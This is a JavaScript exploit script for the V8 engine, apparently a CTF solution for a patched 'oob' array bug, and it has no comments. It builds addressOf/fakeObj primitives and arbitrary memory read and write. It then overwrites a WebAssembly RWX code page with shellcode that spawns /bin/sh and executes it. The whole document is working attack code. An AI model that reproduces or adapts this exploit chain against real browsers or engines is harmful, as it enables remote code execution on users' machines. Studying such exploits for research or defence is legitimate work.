var _b = new ArrayBuffer(16);
var _f = new Float64Array(_b);
var _i = new BigUint64Array(_b);
function f2i(f)
{
	_f[0] = f;
	return _i[0];
}
function i2f(i)
{
	_i[0] = i;
	return _f[0];
}
function hex(i)
{
	return "0x"+i.toString(16).padStart(16,"0");
}
var obj = {a:"a"};
var oa = [obj];
var fa = [1.1];
var mo = oa.oob();
var mf = fa.oob();

function addressOf(obj)
{
	oa[0]=obj;
	oa.oob(mf);
	let res = f2i(oa[0])-1n;
	oa.oob(mo);
	return res;
}
function fakeObj(address)
{
	fa[0] = i2f(address+1n);
	fa.oob(mo);
	let res = fa[0];
	fa.oob(mf);
	return res;
}
var c= [1.1,1.1,1.1,1.1];
var mc = c.oob();
var fake =[
mc,i2f(0n),i2f(0n),i2f(0x1000000000n),1.1,2.2
]
var fakeobj= fakeObj(addressOf(fake)-0x30n);
function aar(addr)
{
	fake[2] = i2f(addr-0xfn);
	return f2i(fakeobj[0]);
}
function aaw(addr,vul)
{

	fake[2] = i2f(addr-0xfn);	
	fakeobj[0] = i2f(vul);
}


var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f= wasmInstance.exports.main;

var sh_addr = aar(aar(addressOf(wasmCode)+0x10n)-1n+0x18n);
var tmp1 = aar(sh_addr);
var shell = [ 0xf631483bb0c03148n, 0x69622fbf48d23148n, 0x8948570068732f6en, 0x50fe7n,];


var tmp = aar(addressOf(f)+0x18n)-1n;
tmp = aar(tmp+8n)-1n;
tmp = aar(tmp+0x10n)-1n
tmp = aar(tmp+0x88n)
//console.log(hex(tmp));

var buf =new ArrayBuffer(shell.length*8);
aaw(addressOf(buf)+0x20n,tmp);
var v =new DataView(buf);
for(let i=0;i<shell.length;i++){
	v.setFloat64(i*8,i2f(shell[i]),true);
}
f();
